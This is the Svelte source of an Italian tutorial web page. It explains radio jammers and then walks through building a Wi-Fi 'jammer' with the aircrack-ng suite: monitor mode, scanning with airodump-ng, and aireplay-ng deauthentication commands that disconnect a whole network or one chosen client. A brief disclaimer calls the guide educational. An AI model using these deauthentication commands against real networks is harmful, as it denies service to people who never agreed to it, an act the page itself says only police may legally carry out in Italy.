<script lang="ts">
  import Article from "../lib/article.svelte";
  import Bash from "../lib/bash.svelte";
  import 'purecss/build/base-min.css';
</script>

<svelte:head>
  <title>Jammer</title>
  <link rel="stylesheet" href="/css/jammer.css" />
</svelte:head>

<section>
  <div class="container">
    <Article
      imgmaxwidth="500px"
      header="Il Jammer"
      meta="Scritto da Andrea Canale e Marco Cellini Venerdì 6 Maggio 2022"
      subtitle="Cos'è un Jammer?"
      text="Il jammer è un disturbatore di segnale volto a bloccare le comunicazioni radio, infatti un jammer 
      crea un disturbo sulla fruquenza selezionata e impedisce ai dispositivi che lavorano su quella frequenza di comunicare.
      L'uso in Italia è consentito solo alle forze dell'ordine ed è stato usato in passato per bloccare terroristi o detonatori a distanza ad esempio.
      I più diffusi bloccano le reti mobili GSM per impedire le comunicazioni, infatti il GSM è la frequenza usata un tempo per telefonare,
      adesso con l'avvento del VoLTE questa banda sta entrando in disuso ma è ancora usata per tutte quelle chiamate di emergenza che hanno bisogno di una comunicazione stabile che solo il GSM può offrire.
      Gli ultimi modelli di Jammer, tuttavia riescono a colpire anche alcune bande 4G e 5G a lungo raggio e il GPS a corto raggio.
      C'è anche l'anti-jammer che serve come rivelatore di disturbi che quindi avvisa della presenza di un disturbo duraturo."
      imgcomment="Un jammer a 18 frequenze"
      imgsrc="/img/slide/jammer.png"
    />
  </div>
  <hr class="uk-divider-icon" />
  <h1>Costruiamo un Jammer Wi-Fi</h1>
  <div align="center" class="container">
    <h5 class="text">
      La guida è a scopo didattico, i creatori non sono responsabili di
      eventuali disagi arrecati ad altri seguendo questa guida.
    </h5>
    <p class="text">
      Per questa guida ci servirà una distribuzione di Linux o BSD o Mac OS e
      una scheda di rete compatibile (trovate alcuni dei modelli compatibile <a
        href="javascript:window.open('https://www.kali.org/docs/nethunter/wireless-cards/')"
        >qui</a
      >)
    </p>

    <p class="text">Installiamo la suite di Aircrack sul nostro OS</p>
    <Bash
      command="sudo apt-get install aircrack-ng #Debian e derivate"
      background="grey"
      commandcolor="white"
    />
    <Bash
      command="sudo yum install aircrack-ng #Red Hat e derivate"
      background="grey"
      commandcolor="white"
    />
    <Bash
      command="sudo pacman -S aircrack-ng #Arch Linux e derivate"
      background="grey"
      commandcolor="white"
    />
    <Bash
      command="brew install aircrack-ng #Mac OS"
      background="grey"
      commandcolor="white"
    />
    <p class="text">
      Ora prendiamo il nome della nostra scheda Wi-Fi attraverso il seguente
      comando
    </p>
    <Bash command="iwconfig" background="grey" commandcolor="white" />
    <p class="text">
      Adesso che sappiamo il nome della scheda, avviamo airmon per mandare la
      nostra scheda di rete in Monitor Mode, una modalità dove possiamo
      catturare i pacchetti Wi-Fi(Handshake di autorizzazione, dispositivi
      connessi ad una rete...) e analizzare completamente lo spettro 2.4 Ghz e 5
      Ghz (chiaramente dipende dall'adattatore).
    </p>
    <Bash
      command="airmon-ng start wlan0"
      background="grey"
      commandcolor="white"
    />
    <p class="text">
      Se il comando non dà errori la nostra scheda è pronta per catturare tutto
      lo spettro.
    </p>
    <p class="text">
      Iniziamo ad analizzare lo spettro con il seguente comando
    </p>
    <Bash
      command="airodump-ng wlan0mon #wlan0mon = nome scheda + mon"
      background="grey"
      commandcolor="white"
    />
    <!--Immagine di prova, appena arriva un portatile la sostituisco :-) -->
    <div uk-lightbox>
      <a href="/img/airodump.png">
        <img src="/img/airodump.png" alt="airodump" class="pure-img" />
      </a>
    </div>
    <p class="text">
      Come possiamo vedere qui abbiamo tutte le informazioni delle nostre reti
      Wi-Fi come il BSSID, la potenza, l'SSID e altri parametri, in basso ci
      sono tutti i client connessi alle reti.
    </p>
    <p class="text">
      Quello che ci serve da questa schermata è il BSSID che vogliamo attaccare
      con il nostro Jammer.
    </p>
    <p class="text">
      Una volta preso il BSSID lanciamo il seguente comando sostituendo il BSSID
      e il canale di trasmissione.
    </p>
    <Bash
      command="aireplay-ng -0 1 -a 00:14:6C:7E:40:80 wlan0mon # dopo -a mettiamo il BSSID"
      background="grey"
      commandcolor="white"
    />
    <p class="text">
      Per un attacco più preciso possiamo mirare ad un client unico e non
      all'intero Wi-Fi, prendendo uno dei client connessi al Wi-Fi dalla
      schermata di airodump(dalla colonna STATION), facendo attenzione che il
      BSSID coincida.
    </p>
    <Bash
      command=" aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon # dopo -c mettiamo il MAC address del client che vogliamo deautenticare"
      background="grey"
      commandcolor="white"
    />
    <p class="text">
      Dopo l'inizio dell'attacco il client inizierà a non ricevere più
      connessione anche se lui sarà sempre connesso alla rete secondo il suo OS.
    </p>
  </div>
  <br />
</section>
